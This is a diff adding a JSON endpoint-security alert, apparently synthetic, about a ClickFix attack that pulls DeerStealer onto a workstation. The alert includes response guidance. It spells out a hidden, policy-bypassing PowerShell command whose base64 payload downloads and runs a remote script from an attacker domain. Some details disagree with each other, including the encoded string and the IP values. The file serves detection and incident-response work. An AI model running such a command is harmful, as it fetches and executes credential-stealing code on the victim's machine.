@@ -1,0 +1,56 @@
+{
+  "vendor": "Cortex XDR",
+  "product": "Endpoint Protection",
+  "severity": "Critical",
+  "category": "Execution",
+  "alert_name": "Obfuscated PowerShell Execution - ClickFix Fileless Malware Download",
+  "description": "Cortex XDR detected critical PowerShell execution on workstation MKTG-WKS-024 where user manually executed ClickFix-injected command via Windows Run dialog (Win+R). Process telemetry shows powershell.exe (PID 7452) launched with suspicious command line: 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbABuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAHMALgBsAGkAdgBlAC8AZABsAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA='. Base64 decoding reveals: IEX(New-Object Net.WebClient).DownloadString('https://cdn-updates[.]live/dl/payload.ps1'), classic fileless attack downloading second-stage payload directly into memory without disk writes. Parent process: explorer.exe (PID 2184) confirming user interaction via Windows Run dialog, execution timestamp 14:24:02 UTC (15 seconds after clipboard injection). Behavioral analysis identified multiple evasion techniques: (1) -NoProfile flag bypassing PowerShell profile-based restrictions, (2) -ExecutionPolicy Bypass disabling script execution policies, (3) -WindowStyle Hidden concealing PowerShell console window, (4) Base64 encoding obfuscating command from basic inspection, (5) IEX (Invoke-Expression) executing downloaded script directly in memory. Network activity shows PowerShell establishing HTTPS connection to cdn-updates[.]live (185.220.102[.]43, Cloudflare) at 14:24:03 UTC, receiving 23KB response (payload.ps1 PowerShell script). Script analysis reveals DeerStealer infostealer: credential harvesting logic for Chrome/Edge/Firefox browsers, cryptocurrency wallet enumeration, Discord token theft, screenshot capture, system reconnaissance (installed software, network config). PowerShell process created child process: conhost.exe (console host) and injected code into legitimate Windows process WMIC.exe for stealth. EDR flagged execution based on: suspicious command-line arguments, parent-child process relationship anomaly (explorer.exe \u2192 powershell.exe), network connection to newly registered domain, in-memory script execution without file drops.",
+  "relative_timestamp_hours": 71.25,
+  "campaign_name": "ClickFix-DeerStealer",
+  "host_name": "MKTG-WKS-024",
+  "host_ip": [
+    171540620
+  ],
+  "user_name": [
+    "jdavis@marketingcorp.com"
+  ],
+  "domain": "marketingcorp.com",
+  "process_name": [
+    "powershell.exe"
+  ],
+  "process_path": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "process_cmd": [
+    "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQBzAC4AbABpAHYAZQAvAGQAbAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+  ],
+  "parent_process_name": [
+    "explorer.exe"
+  ],
+  "parent_process_path": [
+    "C:\\Windows\\explorer.exe"
+  ],
+  "local_ip": [
+    171540620
+  ],
+  "remote_ip": [
+    3119005227
+  ],
+  "dns_query_name": [
+    "cdn-updates.live"
+  ],
+  "threat_name": "ClickFix - PowerShell Execution",
+  "attack_mode": "Fileless Malware Download",
+  "verdict": "Malicious",
+  "risk_score": "99",
+  "risk_rating": "Critical",
+  "policy_type": "Behavioral Threat Protection",
+  "policy_description": "User-initiated PowerShell execution with obfuscated ClickFix payload - DeerStealer download",
+  "policy_severity": "Critical",
+  "policy_recommendation": "CRITICAL: Terminate powershell.exe PID 7452 immediately, kill all child processes (WMIC.exe injection), isolate MKTG-WKS-024 from network, enable PowerShell constrained language mode to prevent future IEX abuse, implement AppLocker/WDAC policies blocking PowerShell execution from explorer.exe parent, hunt for in-memory DeerStealer artifacts (browser credential dumping, Discord token theft), reset all user credentials (browsers, Windows, corporate apps), block cdn-updates[.]live domain, enable PowerShell script block logging and transcription for forensics, analyze memory dump for additional injected payloads",
+  "log_source": "Cortex XDR Agent - Behavioral Threat Protection",
+  "event_id": "BTP_POWERSHELL_ABUSE",
+  "external_link": "https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/",
+  "mitre_att&ck_tactic": "TA0002 - Execution",
+  "mitre_att&ck_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell"
+}
